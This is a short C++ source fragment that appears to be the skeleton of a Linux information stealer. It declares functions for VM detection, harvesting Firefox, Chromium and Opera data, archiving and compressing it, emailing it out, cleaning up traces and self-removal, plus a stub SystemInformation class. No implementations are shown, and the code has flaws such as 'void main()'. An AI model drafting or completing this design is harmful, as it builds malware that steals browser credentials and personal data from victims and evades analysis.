#include <stdlib.h>
#include <ctime>
#include <iostream>

using namespace std;

void main();
int performChecks(bool vmDetect=true);
int createArchiveDestination(string archiveName);
int fetchSysInfo(string archiveName);
int fetchFirefox(string archiveName);
int fetchChromium(string archiveName);
int fetchOpera(string archiveName);
int compressArchive(string archiveName);
int exfilData(string archiveName, string emailAddress);
int cleanUp(string archiveName);
void selfRemove();

class SystemInformation{
    public:
        void setTime();
        void getHostname();
    private:
        string systemPlatform = "Linux";
        string systemHostname;
        string time;
};